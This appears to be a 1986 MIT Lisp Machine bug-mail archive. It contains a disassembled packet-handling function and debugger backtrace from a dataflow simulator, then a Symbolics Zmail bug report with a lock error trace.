265 MOVE D-PDL FEF|34         ;*MY-PE-NUMBER*
266 POP LOCAL|1               ;DEST-PE
267 MOVEM LOCAL|0             ;OP-CODE
270 = FEF|36                  ;'11206145
271 BR-NIL LONG 1077
273 PUSH-NUMBER 241
274 MOVE D-PDL FEF|35         ;'196608
275 (MISC) %NUBUS-READ D-PDL
276 POP LOCAL|2               ;DESC-INDEX
277 MOVE D-PDL FEF|33         ;*I-STR-TABLE*
300 MOVE D-PDL LOCAL|2        ;DESC-INDEX
301 (MISC) COMMON-LISP-AR-1 D-PDL
302 POP LOCAL|3               ;I-STRUCTURE
303 PUSH-NUMBER 241
304 MOVE D-PDL FEF|35         ;'196608
305 (MISC) %NUBUS-READ D-PDL
306 POP LOCAL|4               ;INDEX
307 MOVE D-PDL LOCAL|3        ;I-STRUCTURE
310 AR-1 (1) D-PDL
311 MOVE D-PDL LOCAL|4        ;INDEX
312 (MISC) COMMON-LISP-AR-1 D-PDL
313 POP LOCAL|5               ;CONTROL
314 PUSH-NUMBER 241
315 MOVE D-PDL FEF|35         ;'196608
316 (MISC) %NUBUS-READ D-PDL
317 POP LOCAL|6               ;CONTEXT
320 PUSH-NUMBER 241
321 MOVE D-PDL FEF|35         ;'196608
322 (MISC) %NUBUS-READ D-PDL
323 POP LOCAL|7               ;ITERATION
324 PUSH-NUMBER 241
325 MOVE D-PDL FEF|35         ;'196608
326 (MISC) %NUBUS-READ D-PDL
327 POP LOCAL|8               ;DESTINATION
330 PUSH-NUMBER 241
331 MOVE D-PDL FEF|35         ;'196608
332 (MISC) %NUBUS-READ D-PDL
333 (MISC) ZEROP D-PDL
334 POP LOCAL|9               ;BINARY?
335 PUSH-NUMBER 241
336 MOVE D-PDL FEF|35         ;'196608
337 (MISC) %NUBUS-READ D-PDL
340 POP LOCAL|10              ;DEST-ARG
341 PUSH-NUMBER 241
342 MOVE D-PDL FEF|35         ;'196608
343 (MISC) %NUBUS-READ D-PDL
344 POP LOCAL|11              ;RESPOND-TO-PE
345 PUSH-NUMBER 241
346 MOVE D-PDL FEF|35         ;'196608
347 (MISC) %NUBUS-READ D-PDL
350 MOVE D-PDL FEF|32         ;*INCOMING-SERIAL-STAMPS*
351 MOVE D-PDL LOCAL|11       ;RESPOND-TO-PE
352 PUSH-NUMBER 23
353 MOVE D-PDL FEF|32         ;*INCOMING-SERIAL-STAMPS*
354 MOVE D-PDL LOCAL|11       ;RESPOND-TO-PE
355 (MISC) COMMON-LISP-AR-1 D-PDL
356 (MISC) 1+ D-PDL
357 (MISC) LDB D-PDL
360 (MISC) SET-AR-1 D-PDL
361 POP LOCAL|13              ;SERIAL-IN-SHOULD-BE
362 MOVEM LOCAL|12            ;SERIAL-IN
363 = LOCAL|13                ;SERIAL-IN-SHOULD-BE
364 BR-NIL 367
365 MOVE D-IGNORE LOCAL|12    ;SERIAL-IN
366 BR 420
367 MOVE D-PDL LOCAL|12       ;SERIAL-IN
370 (MISC) 1+ D-PDL
371 = LOCAL|13                ;SERIAL-IN-SHOULD-BE
372 BR-NIL 412
373 MOVE D-PDL FEF|32         ;*INCOMING-SERIAL-STAMPS*
374 MOVE D-PDL LOCAL|11       ;RESPOND-TO-PE
375 PUSH-NUMBER 23
376 MOVE D-PDL FEF|32         ;*INCOMING-SERIAL-STAMPS*
377 MOVE D-PDL LOCAL|11       ;RESPOND-TO-PE
400 (MISC) COMMON-LISP-AR-1 D-PDL
401 (MISC) 1- D-PDL
402 (MISC) LDB D-PDL
403 (MISC) SET-AR-1 D-IGNORE
404 CALL D-IGNORE FEF|37      ;#'REPORT
405 MOVE D-PDL FEF|38         ;':WARNING
406 MOVE D-PDL FEF|39         ;'"Duplicate Packet from PE ~D -- ignored"
407 MOVE D-LAST LOCAL|11      ;RESPOND-TO-PE
410 BR LONG 2773
412 CALL D-IGNORE FEF|37      ;#'REPORT
413 MOVE D-PDL FEF|40         ;':ERROR
414 MOVE D-PDL FEF|41         ;'"Packet Serial Number Inconsistency!! Expecting ~D But Got ~D From PE: ~D"
415 MOVE D-PDL LOCAL|13       ;SERIAL-IN-SHOULD-BE
416 MOVE D-PDL LOCAL|12       ;SERIAL-IN
417 MOVE D-LAST LOCAL|11      ;RESPOND-TO-PE
420 BR-NIL LONG 2773
422 SETE-1+ FEF|31            ;*I-FETCH-COUNTER*
423 MOVE D-PDL LOCAL|5        ;CONTROL
424 (MISC) FIXP D-IGNORE
425 BR-NIL 705
426 PUSH-NUMBER 241
427 PUSH-NUMBER 0
430 (MISC) %NUBUS-READ-8B D-PDL
431 = FEF|42                  ;'255
432 BR-NOT-NIL 434
433 CALL0 D-IGNORE FEF|43     ;#'FINISH-SENDING-MESSAGE
434 SETE-1+ FEF|30            ;*TOTAL-PACKETS-SENT*
435 PUSH-NUMBER 241
436 MOVE D-PDL FEF|44         ;'131072
437 PUSH-NUMBER 0
440 (MISC) %NUBUS-WRITE-8B D-IGNORE
441 PUSH-NUMBER 241
442 MOVE D-PDL FEF|45         ;'263168
443 MOVE D-PDL FEF|29         ;*MY-VIEW-OF-THE-WORLD*
444 MOVE D-PDL LOCAL|11       ;RESPOND-TO-PE
445 (MISC) COMMON-LISP-AR-1 D-PDL
446 (MISC) %NUBUS-WRITE D-IGNORE
447 PUSH-NUMBER 241
450 MOVE D-PDL FEF|46         ;'262144
451 MOVE D-PDL FEF|47         ;'11205125
452 (MISC) %NUBUS-WRITE D-IGNORE
453 PUSH-NUMBER 241
454 MOVE D-PDL FEF|46         ;'262144
455 MOVE D-PDL LOCAL|6        ;CONTEXT
456 (MISC) %NUBUS-WRITE D-IGNORE
457 PUSH-NUMBER 241
460 MOVE D-PDL FEF|46         ;'262144
461 MOVE D-PDL LOCAL|7        ;ITERATION
462 (MISC) %NUBUS-WRITE D-IGNORE
463 PUSH-NUMBER 241
464 MOVE D-PDL FEF|46         ;'262144
465 MOVE D-PDL LOCAL|8        ;DESTINATION
466 (MISC) %NUBUS-WRITE D-IGNORE
467 PUSH-NUMBER 241
470 MOVE D-PDL FEF|46         ;'262144
471 MOVE D-IGNORE LOCAL|9     ;BINARY?
472 BR-NIL 475
473 PUSH-NUMBER 0
474 BR 476
475 PUSH-NUMBER 1
476 (MISC) %NUBUS-WRITE D-IGNORE
477 PUSH-NUMBER 241
500 MOVE D-PDL FEF|46         ;'262144
501 PUSH-NUMBER 255
502 = LOCAL|10                ;DEST-ARG
503 BR-NOT-NIL 515
504 MOVE D-IGNORE LOCAL|10    ;DEST-ARG
505 BR-NIL 515
506 PUSH-NUMBER 255
507 = LOCAL|10                ;DEST-ARG
510 BR-NIL 513
511 MOVE D-PDL 'NIL
512 BR 516
513 MOVE D-PDL LOCAL|10       ;DEST-ARG
514 BR 516
515 PUSH-NUMBER 255
516 (MISC) %NUBUS-WRITE D-IGNORE
517 MOVE D-PDL LOCAL|3        ;I-STRUCTURE
520 AR-1 (0) D-PDL
521 MOVE D-PDL LOCAL|4        ;INDEX
522 (MISC) COMMON-LISP-AR-1 D-PDL
523 MOVEM LOCAL|14
524 (MISC) FLOATP D-IGNORE
525 BR-NIL 557
526 PUSH-NUMBER 241
527 MOVE D-PDL FEF|46         ;'262144
530 PUSH-NUMBER 3
531 (MISC) %NUBUS-WRITE D-IGNORE
532 PUSH-NUMBER 241
533 MOVE D-PDL FEF|46         ;'262144
534 PUSH-NUMBER 25
535 MOVE D-PDL LOCAL|3        ;I-STRUCTURE
536 AR-1 (0) D-PDL
537 MOVE D-PDL LOCAL|4        ;INDEX
540 (MISC) COMMON-LISP-AR-1 D-PDL
541 PUSH-NUMBER 0
542 (MISC) %P-LDB-OFFSET D-PDL
543 (MISC) %NUBUS-WRITE D-IGNORE
544 PUSH-NUMBER 241
545 MOVE D-PDL FEF|46         ;'262144
546 PUSH-NUMBER 25
547 MOVE D-PDL LOCAL|3        ;I-STRUCTURE
550 AR-1 (0) D-PDL
551 MOVE D-PDL LOCAL|4        ;INDEX
552 (MISC) COMMON-LISP-AR-1 D-PDL
553 PUSH-NUMBER 1
554 (MISC) %P-LDB-OFFSET D-PDL
555 (MISC) %NUBUS-WRITE D-IGNORE
556 BR 662
557 MOVE D-PDL LOCAL|14
560 MOVE D-PDL FEF|48         ;'ISD
561 (MISC) TYPEP-STRUCTURE-OR-FLAVOR D-IGNORE
562 BR-NIL 610 <============================== PC WAS HERE ON ERROR ************
563 PUSH-NUMBER 241
564 MOVE D-PDL FEF|46         ;'262144
565 PUSH-NUMBER 6
566 (MISC) %NUBUS-WRITE D-IGNORE
567 PUSH-NUMBER 241
570 MOVE D-PDL FEF|46         ;'262144
571 MOVE D-PDL LOCAL|3        ;I-STRUCTURE
572 AR-1 (0) D-PDL
573 MOVE D-PDL LOCAL|4        ;INDEX
574 (MISC) COMMON-LISP-AR-1 D-PDL
575 AR-1 (0) D-PDL
576 (MISC) %NUBUS-WRITE D-IGNORE
577 PUSH-NUMBER 241
600 MOVE D-PDL FEF|46         ;'262144
601 MOVE D-PDL LOCAL|3        ;I-STRUCTURE
602 AR-1 (0) D-PDL
603 MOVE D-PDL LOCAL|4        ;INDEX
604 (MISC) COMMON-LISP-AR-1 D-PDL
605 AR-1 (1) D-PDL
606 (MISC) %NUBUS-WRITE D-IGNORE
607 BR 662
610 MOVE D-PDL LOCAL|14
611 (MISC) FIXNUMP D-IGNORE
612 BR-NIL 627
613 PUSH-NUMBER 241
614 MOVE D-PDL FEF|46         ;'262144
615 PUSH-NUMBER 1
616 (MISC) %NUBUS-WRITE D-IGNORE
617 PUSH-NUMBER 241
620 MOVE D-PDL FEF|46         ;'262144
621 MOVE D-PDL LOCAL|3        ;I-STRUCTURE
622 AR-1 (0) D-PDL
623 MOVE D-PDL LOCAL|4        ;INDEX
624 (MISC) COMMON-LISP-AR-1 D-PDL
625 (MISC) %NUBUS-WRITE D-IGNORE
626 BR 662
627 MOVE D-PDL LOCAL|14
630 (MISC) SYMBOLP D-IGNORE
631 BR-NIL 646
632 PUSH-NUMBER 241
633 MOVE D-PDL FEF|46         ;'262144
634 MOVE D-PDL LOCAL|3        ;I-STRUCTURE
635 AR-1 (0) D-PDL
636 MOVE D-PDL LOCAL|4        ;INDEX
637 (MISC) COMMON-LISP-AR-1 D-IGNORE
640 BR-NIL 643
641 PUSH-NUMBER 7
642 BR 644
643 PUSH-NUMBER 4
644 (MISC) %NUBUS-WRITE D-IGNORE
645 BR 662
646 CALL D-IGNORE FEF|37      ;#'REPORT
647 MOVE D-PDL FEF|40         ;':ERROR
650 MOVE D-PDL FEF|49         ;'"Can't send this type (~A) over the network, ~A"
651 CALL D-PDL FEF|50         ;#'TYPE-OF
652 MOVE D-PDL LOCAL|3        ;I-STRUCTURE
653 AR-1 (0) D-PDL
654 MOVE D-PDL LOCAL|4        ;INDEX
655 (MISC) COMMON-LISP-AR-1 D-LAST
656 MOVE D-PDL LOCAL|3        ;I-STRUCTURE
657 AR-1 (0) D-PDL
660 MOVE D-PDL LOCAL|4        ;INDEX
661 (MISC) COMMON-LISP-AR-1 D-LAST
662 SETE-1+ FEF|28            ;*PACKETS-TRANSFERRED*
663 PUSH-NUMBER 241
664 MOVE D-PDL FEF|46         ;'262144
665 MOVE D-PDL FEF|34         ;*MY-PE-NUMBER*
666 (MISC) %NUBUS-WRITE D-IGNORE
667 PUSH-NUMBER 241
670 MOVE D-PDL FEF|51         ;'286720
671 MOVE D-PDL FEF|27         ;*OUTGOING-SERIAL-STAMPS*
672 MOVE D-PDL LOCAL|11       ;RESPOND-TO-PE
673 PUSH-NUMBER 23
674 MOVE D-PDL FEF|27         ;*OUTGOING-SERIAL-STAMPS*
675 MOVE D-PDL LOCAL|11       ;RESPOND-TO-PE
676 (MISC) COMMON-LISP-AR-1 D-PDL
677 (MISC) 1+ D-PDL
700 (MISC) LDB D-PDL
701 (MISC) SET-AR-1 D-PDL
702 (MISC) %NUBUS-WRITE D-IGNORE
703 BR LONG 2773
705 MOVE D-IGNORE LOCAL|5     ;CONTROL
706 BR-NOT-NIL 774
707 MOVE D-PDL FEF|26         ;*FREE-TOKENS*
710 POP LOCAL|15              ;.TOKEN.
711 BR-NIL 716
712 MOVE D-PDL LOCAL|15       ;.TOKEN.
713 AR-1 (5) D-PDL
714 POP FEF|26                ;*FREE-TOKENS*
715 BR 727
716 MOVE D-PDL FEF|25         ;TOKEN-AREA
717 BIND-POP FEF|6            ;DEFAULT-CONS-AREA
720 CALL0 D-PDL FEF|52        ;#'MAKE-TOKEN
721 POP LOCAL|15              ;.TOKEN.
722 (MISC) UNBIND 1 binding 
723 MOVE D-PDL LOCAL|15       ;.TOKEN.
724 MOVE D-PDL FEF|24         ;*ALL-TOKENS*
725 (MISC) CONS D-PDL
726 POP FEF|24                ;*ALL-TOKENS*
727 MOVE D-PDL LOCAL|15       ;.TOKEN.
730 MOVE D-PDL LOCAL|11       ;RESPOND-TO-PE
731 SET-AR-1 (0) D-IGNORE
732 MOVE D-PDL LOCAL|15       ;.TOKEN.
733 MOVE D-PDL LOCAL|6        ;CONTEXT
734 SET-AR-1 (1) D-IGNORE
735 MOVE D-PDL LOCAL|15       ;.TOKEN.
736 MOVE D-PDL LOCAL|7        ;ITERATION
737 SET-AR-1 (2) D-IGNORE
740 MOVE D-PDL LOCAL|15       ;.TOKEN.
741 MOVE D-PDL LOCAL|8        ;DESTINATION
742 SET-AR-1 (7) D-IGNORE
743 MOVE D-PDL LOCAL|15       ;.TOKEN.
744 MOVE D-PDL LOCAL|9        ;BINARY?
745 SET-AR-1 (8) D-IGNORE
746 MOVE D-PDL LOCAL|15       ;.TOKEN.
747 PUSH-NUMBER 255
750 = LOCAL|10                ;DEST-ARG
751 BR-NIL 754
752 MOVE D-PDL 'NIL
753 BR 755
754 MOVE D-PDL LOCAL|10       ;DEST-ARG
755 SET-AR-1 (9) D-IGNORE
756 MOVE D-PDL LOCAL|15       ;.TOKEN.
757 MOVE D-PDL 'NIL
760 SET-AR-1 (3) D-IGNORE
761 MOVE D-PDL LOCAL|15       ;.TOKEN.
762 MOVE D-PDL 'NIL
763 SET-AR-1 (5) D-IGNORE
764 MOVE D-PDL LOCAL|15       ;.TOKEN.
765 MOVE D-PDL 'NIL
766 SET-AR-1 (4) D-IGNORE
767 MOVE D-PDL LOCAL|15       ;.TOKEN.
770 MOVEM LOCAL|16            ;.COPY.
771 MOVE D-PDL FEF|53         ;':DEFERRED-READ
772 SET-AR-1 (4) D-IGNORE
773 BR 1070
774 MOVE D-PDL LOCAL|5        ;CONTROL
775 MOVE D-PDL FEF|54         ;'TOKEN
776 (MISC) TYPEP-STRUCTURE-OR-FLAVOR D-IGNORE
777 BR-NIL LONG 2773
1001 MOVE D-PDL FEF|26        ;*FREE-TOKENS*
1002 POP LOCAL|15             ;.TOKEN.
1003 BR-NIL 1010
1004 MOVE D-PDL LOCAL|15      ;.TOKEN.
1005 AR-1 (5) D-PDL
1006 POP FEF|26               ;*FREE-TOKENS*
1007 BR 1021
1010 MOVE D-PDL FEF|25        ;TOKEN-AREA
1011 BIND-POP FEF|6           ;DEFAULT-CONS-AREA
1012 CALL0 D-PDL FEF|52       ;#'MAKE-TOKEN
1013 POP LOCAL|15             ;.TOKEN.
1014 (MISC) UNBIND 1 binding 
1015 MOVE D-PDL LOCAL|15      ;.TOKEN.
1016 MOVE D-PDL FEF|24        ;*ALL-TOKENS*
1017 (MISC) CONS D-PDL
1020 POP FEF|24               ;*ALL-TOKENS*
1021 MOVE D-PDL LOCAL|15      ;.TOKEN.
1022 MOVE D-PDL LOCAL|11      ;RESPOND-TO-PE
1023 SET-AR-1 (0) D-IGNORE
1024 MOVE D-PDL LOCAL|15      ;.TOKEN.
1025 MOVE D-PDL LOCAL|6       ;CONTEXT
1026 SET-AR-1 (1) D-IGNORE
1027 MOVE D-PDL LOCAL|15      ;.TOKEN.
1030 MOVE D-PDL LOCAL|7       ;ITERATION
1031 SET-AR-1 (2) D-IGNORE
1032 MOVE D-PDL LOCAL|15      ;.TOKEN.
1033 MOVE D-PDL LOCAL|8       ;DESTINATION
1034 SET-AR-1 (7) D-IGNORE
1035 MOVE D-PDL LOCAL|15      ;.TOKEN.
1036 MOVE D-PDL LOCAL|9       ;BINARY?
1037 SET-AR-1 (8) D-IGNORE
1040 MOVE D-PDL LOCAL|15      ;.TOKEN.
1041 PUSH-NUMBER 255
1042 = LOCAL|10               ;DEST-ARG
1043 BR-NIL 1046
1044 MOVE D-PDL 'NIL
1045 BR 1047
1046 MOVE D-PDL LOCAL|10      ;DEST-ARG
1047 SET-AR-1 (9) D-IGNORE
1050 MOVE D-PDL LOCAL|15      ;.TOKEN.
1051 MOVE D-PDL 'NIL
1052 SET-AR-1 (3) D-IGNORE
1053 MOVE D-PDL LOCAL|15      ;.TOKEN.
1054 MOVE D-PDL 'NIL
1055 SET-AR-1 (5) D-IGNORE
1056 MOVE D-PDL LOCAL|15      ;.TOKEN.
1057 MOVE D-PDL 'NIL
1060 SET-AR-1 (4) D-IGNORE
1061 MOVE D-PDL LOCAL|15      ;.TOKEN.
1062 MOVEM LOCAL|16           ;.COPY.
1063 MOVE D-PDL FEF|53        ;':DEFERRED-READ
1064 SET-AR-1 (4) D-IGNORE
1065 MOVE D-PDL LOCAL|16      ;.COPY.
1066 MOVE D-PDL LOCAL|5       ;CONTROL
1067 SET-AR-1 (5) D-IGNORE
1070 MOVE D-PDL LOCAL|3       ;I-STRUCTURE
1071 AR-1 (1) D-PDL
1072 MOVE D-PDL LOCAL|4       ;INDEX
1073 MOVE D-PDL LOCAL|16      ;.COPY.
1074 (MISC) SET-AR-1 D-IGNORE
1075 BR LONG 2773
1077 MOVE D-PDL LOCAL|0       ;OP-CODE
1100 = FEF|47                 ;'11205125
1101 BR-NIL 1422
1102 PUSH-NUMBER 241
1103 MOVE D-PDL FEF|35        ;'196608
1104 (MISC) %NUBUS-READ D-PDL
1105 POP LOCAL|6              ;CONTEXT
1106 PUSH-NUMBER 241
1107 MOVE D-PDL FEF|35        ;'196608
1110 (MISC) %NUBUS-READ D-PDL
1111 POP LOCAL|7              ;ITERATION
1112 PUSH-NUMBER 241
1113 MOVE D-PDL FEF|35        ;'196608
1114 (MISC) %NUBUS-READ D-PDL
1115 POP LOCAL|8              ;DESTINATION
1116 PUSH-NUMBER 241
1117 MOVE D-PDL FEF|35        ;'196608
1120 (MISC) %NUBUS-READ D-PDL
1121 (MISC) ZEROP D-PDL
1122 POP LOCAL|9              ;BINARY?
1123 PUSH-NUMBER 241
1124 MOVE D-PDL FEF|35        ;'196608
1125 (MISC) %NUBUS-READ D-PDL
1126 POP LOCAL|10             ;DEST-ARG
1127 PUSH-NUMBER 241
1130 MOVE D-PDL FEF|35        ;'196608
1131 (MISC) %NUBUS-READ D-PDL
1132 MOVEM LOCAL|17           ;DATA-TYPE
1133 = '3
1134 BR-NIL 1160
1135 MOVE D-PDL FEF|23        ;*FLOAT-PROTOTYPE*
1136 + FEF|55                 ;'0.0
1137 POP LOCAL|18             ;.NEW.
1140 PUSH-NUMBER 241
1141 MOVE D-PDL FEF|35        ;'196608
1142 (MISC) %NUBUS-READ D-PDL
1143 PUSH-NUMBER 25
1144 MOVE D-PDL LOCAL|18      ;.NEW.
1145 PUSH-NUMBER 0
1146 (MISC) %P-DPB-OFFSET D-IGNORE
1147 PUSH-NUMBER 241
1150 MOVE D-PDL FEF|35        ;'196608
1151 (MISC) %NUBUS-READ D-PDL
1152 PUSH-NUMBER 25
1153 MOVE D-PDL LOCAL|18      ;.NEW.
1154 PUSH-NUMBER 1
1155 (MISC) %P-DPB-OFFSET D-IGNORE
1156 MOVE D-PDL LOCAL|18      ;.NEW.
1157 BR 1236
1160 PUSH-NUMBER 6
1161 = LOCAL|17               ;DATA-TYPE
1162 BR-NIL 1204
1163 PUSH-NUMBER 241
1164 MOVE D-PDL FEF|35        ;'196608
1165 (MISC) %NUBUS-READ D-PDL
1166 POP LOCAL|19             ;ISD-PE
1167 PUSH-NUMBER 241
1170 MOVE D-PDL FEF|35        ;'196608
1171 (MISC) %NUBUS-READ D-PDL
1172 POP LOCAL|20             ;ISD-DESC
1173 CALL0 D-PDL FEF|56       ;#'MAKE-ISD
1174 MOVEM LOCAL|21           ;ISD
1175 MOVE D-PDL LOCAL|19      ;ISD-PE
1176 SET-AR-1 (0) D-IGNORE
1177 MOVE D-PDL LOCAL|21      ;ISD
1200 MOVE D-PDL LOCAL|20      ;ISD-DESC
1201 SET-AR-1 (1) D-IGNORE
1202 MOVE D-PDL LOCAL|21      ;ISD
1203 BR 1236
1204 PUSH-NUMBER 4
1205 = LOCAL|17               ;DATA-TYPE
1206 BR-NIL 1211
1207 MOVE D-PDL 'NIL
1210 BR 1236
1211 PUSH-NUMBER 1
1212 = LOCAL|17               ;DATA-TYPE
1213 BR-NIL 1220
1214 PUSH-NUMBER 241
1215 MOVE D-PDL FEF|35        ;'196608
1216 (MISC) %NUBUS-READ D-PDL
1217 BR 1236
1220 PUSH-NUMBER 7
1221 = LOCAL|17               ;DATA-TYPE
1222 BR-NIL 1225
1223 MOVE D-PDL FEF|57        ;':UNKNOWN-SYMBOL
1224 BR 1236
1225 PUSH-NUMBER 5
1226 = LOCAL|17               ;DATA-TYPE
1227 BR-NIL 1232
1230 MOVE D-PDL 'T
1231 BR 1236
1232 CALL D-PDL FEF|37        ;#'REPORT
1233 MOVE D-PDL FEF|40        ;':ERROR
1234 MOVE D-PDL FEF|58        ;'"Don't know this data type ~A"
1235 MOVE D-LAST LOCAL|17     ;DATA-TYPE
1236 POP LOCAL|22             ;DATUM
1237 PUSH-NUMBER 241
1240 MOVE D-PDL FEF|35        ;'196608
1241 (MISC) %NUBUS-READ D-PDL
1242 POP LOCAL|23             ;SOURCE-PE
1243 PUSH-NUMBER 241
1244 MOVE D-PDL FEF|35        ;'196608
1245 (MISC) %NUBUS-READ D-PDL
1246 MOVE D-PDL FEF|32        ;*INCOMING-SERIAL-STAMPS*
1247 MOVE D-PDL LOCAL|23      ;SOURCE-PE
1250 PUSH-NUMBER 23
1251 MOVE D-PDL FEF|32        ;*INCOMING-SERIAL-STAMPS*
1252 MOVE D-PDL LOCAL|23      ;SOURCE-PE
1253 (MISC) COMMON-LISP-AR-1 D-PDL
1254 (MISC) 1+ D-PDL
1255 (MISC) LDB D-PDL
1256 (MISC) SET-AR-1 D-PDL
1257 POP LOCAL|13             ;SERIAL-IN-SHOULD-BE
1260 MOVEM LOCAL|12           ;SERIAL-IN
1261 = LOCAL|13               ;SERIAL-IN-SHOULD-BE
1262 BR-NIL 1265
1263 MOVE D-IGNORE LOCAL|12   ;SERIAL-IN
1264 BR 1316
1265 MOVE D-PDL LOCAL|12      ;SERIAL-IN
1266 (MISC) 1+ D-PDL
1267 = LOCAL|13               ;SERIAL-IN-SHOULD-BE
1270 BR-NIL 1310
1271 MOVE D-PDL FEF|32        ;*INCOMING-SERIAL-STAMPS*
1272 MOVE D-PDL LOCAL|23      ;SOURCE-PE
1273 PUSH-NUMBER 23
1274 MOVE D-PDL FEF|32        ;*INCOMING-SERIAL-STAMPS*
1275 MOVE D-PDL LOCAL|23      ;SOURCE-PE
1276 (MISC) COMMON-LISP-AR-1 D-PDL
1277 (MISC) 1- D-PDL
1300 (MISC) LDB D-PDL
1301 (MISC) SET-AR-1 D-IGNORE
1302 CALL D-IGNORE FEF|37     ;#'REPORT
1303 MOVE D-PDL FEF|38        ;':WARNING
1304 MOVE D-PDL FEF|39        ;'"Duplicate Packet from PE ~D -- ignored"
1305 MOVE D-LAST LOCAL|23     ;SOURCE-PE
1306 BR LONG 2773

------------------------------------------------------------

MAIN-CYCLE (P.C. = 405)

 Local 0 (MATCH?): NIL
 Local 1 (ISREQ): NIL
 Local 2 (TOKEN): #<Token: Binary PE: 1 Ctx: 235 Iter:0 Inst: 60>
 Local 3 (MGRREQ): NIL
 Local 4 (NET): T
 Local 5 (TIMER): NIL
 Local 6 (ALU-OPS): 241115
 Local 7 (TOKENS): 367437
 Local 8 (IDLES): 35938
 Local 9 (ALU-OPS-PROFILE): #<ART-Q-1000 56126723>
 Local 10 (IDLE-PROFILE): #<ART-Q-1000 56130677>
 Local 11 (QUEUED-TOKENS-PROFILE): #<ART-Q-1000 40047607>
 Local 12 (WAITING-TOKENS-PROFILE): #<ART-Q-1000 56132653>
 Local 13 (I-FETCH-PROFILE): #<ART-Q-1000 40051563>
 Local 14 (I-STORE-PROFILE): #<ART-Q-1000 40053537>
 Local 15 (INVOKE-PROFILE): #<ART-Q-1000 40055513>
 Local 16 (TERMINATE-PROFILE): #<ART-Q-1000 40057467>
 Local 17 (TOKEN-PROFILE): #<ART-Q-1000 56134627>
 Local 18 (ACTIVE-CB-PROFILE): #<ART-Q-1000 40061443>
 Local 19 (PACKET-PROFILE): #<ART-Q-1000 40063417>
 Local 20 (INTERVAL-TIMES): #<ART-Q-1000 40065373>
 Local 21 (INTERVAL-START): 3075576
 Local 22 (INTERVAL-END): NIL
 Local 23 (INTERVAL-LENGTH): NIL
 Local 24 (COUNT-ACTIVE-CB): NIL
 Local 25 (IDLE-FLAG): T
 Local 26 (HEAD): #<Token: Binary PE: 1 Ctx: 235 Iter:0 Inst: 60>
 Local 27 (.SELECTQ.ITEM.): :I-STORE
 Local 28 (.CONTEXT.): #<Context: ALLOCATE_MATRIX-LOOP0141> Alu-ops: NIL
 Local 29 (.ITER-ARRAY.): #<ART-1B-32 64526370>
 Local 30 (.MAX-ITER.): 0
 Local 31 (.ITER-ID.): 0
 Local 32 (INSTRUCTION-INDEX): 60
 Local 33 (ITERATION): 0
 Local 34 (CONTEXT-INDEX): 235
 Local 35 (CONTEXT): #<Context: ARTIFICIAL_VISCOSITY> Alu-ops: NIL
 Local 36 (.FLAG-WORD-INDEX.): NIL
 Local 37 (.FLAG-BIT-INDEX.): NIL
 Local 38 (.FLAG-WORD.): NIL
 Local 39 (.FLAGS.): NIL
 Local 40 (.FLAG.): NIL
 Local 41 (I): NIL
 Local 42: NIL
 Local 43: NIL
 Local 44 (T-LOW): NIL
 Local 45 (T-HIGH): NIL
 Local 46: NIL


SLAVE (P.C. = 100)



(:PROPERTY :SLAVE ATIG-SERVER) (P.C. = 105)

 Arg 0 (COMMAND): :SLAVE
 Arg 1 (STREAM): #<CHAOS:CHARACTER-STREAM 25252611>
 Local 0: (NIL . #<Token: Binary PE: 1 Ctx: 235 Iter:0 Inst: 60>)
 Local 1: (T)


ATIG-SERVER (P.C. = 312)

 Local 0: (#<DTP-FEF-POINTER (:PROPERTY :SLAVE ATIG-SERVER) 11535270> . :SLAVE)
 Local 1: (1298 . 69)
 Local 2 (STREAM): #<CHAOS:CHARACTER-STREAM 25252611>
 Local 3 (COMMAND): :SLAVE
 Local 4 (FUNCTION): #<DTP-FEF-POINTER (:PROPERTY :SLAVE ATIG-SERVER) 11535270>


Remainder of stack:

SI::PROCESS-RUN-FUNCTION-INTERNAL (P.C. = 100)
SI::PROCESS-TOP-LEVEL (P.C. = 244)
19-Mar-86 11:45:54-EST,2155;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 19 Mar 86 11:45-EST
Received: from REAGAN.AI.MIT.EDU by MC.LCS.MIT.EDU via Chaosnet; 19 MAR 86  11:43:56 EST
Received: from OZ.AI.MIT.EDU by MIT-REAGAN.ARPA via CHAOS with CHAOS-MAIL id 26200; Wed 19-Mar-86 08:17:38-EST
Received: from MORRISON.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 19 Mar 86 08:17-EST
Date: Wed, 19 Mar 86 08:15 EST
From: JCMA@MIT-AI.ARPA
Subject: Zmail lossage
To: BUG-LISPM@MIT-REAGAN.ARPA
Message-ID: <860319081536.6.JCMA@MIT-MORRISON.ARPA>

In Symbolics 3600 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.11,
AISite 14.1, Experimental RELATUS 147.45, microcode TMC5-MIC 336,
FEP 127, FEP0:>v127-lisp.flod(2), FEP0:>v127-loaders.flod(2),
FEP0:>v127-debug.flod(1), FEP0:>v127-info.flod(2), on Lisp Machine Jim Morrison:

I tried to hard copy a temporary collection in the experimental mode.  When I
tried to changed the hardcopy defaults by clicking right on hardcopy in the
move menu, I got no response.  I aborted and tried to redo the operation using
the defaults and the system got wedged between processes with (no window) in
the wholine.  It was unable to get to any other window or the cold load
stream.  I have to warm boot.  this is what I found waiting for after that.

>>Error: Attempt to unlock #<DTP-LOCATIVE 144201764>, which you don't have locked
While in the function PROCESS-UNLOCK  ZWEI:ZMAIL-BACKGROUND-LOOP-BODY  ZWEI:ZMAIL-BACKGROUND

PROCESS-UNLOCK:  (P.C. = 21)
   Arg 0 (SI:LOCATIVE-POINTER): #<DTP-LOCATIVE 144201764>
   --Defaulted args:--
   Arg 1 (SI:LOCK-VALUE): #<ZMAIL-BACKGROUND-PROCESS Zmail background 144201734>
   Arg 2 (SI:ERROR-P): T

ZWEI:ZMAIL-BACKGROUND-LOOP-BODY:  (P.C. = 100)
   Arg 0 (ZWEI:LOCK): #<DTP-LOCATIVE 144201764>
   Arg 1 (ZWEI:COMMAND-BUFFER-POINTER): #<DTP-LOCATIVE 144201763>
   Arg 2 (ZWEI:PRELOAD-QUEUE-POINTER): #<DTP-LOCATIVE 144201765>
   Arg 3 (ZWEI:PRELOAD-FILE-POINTER): #<DTP-LOCATIVE 144201766>

ZWEI:ZMAIL-BACKGROUND:
   Arg 0: #<ZMAIL-FRAME Main Zmail Window 43200325 deexposed>

SI:PROCESS-TOP-LEVEL:  (P.C. = 54)
   --Defaulted args:--
   Arg 0 (IGNORE): NIL
21-Mar-86 18:04:39-EST,9556;000000000000
Received: from ZERMATT.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 21 Mar 86 18:04-EST
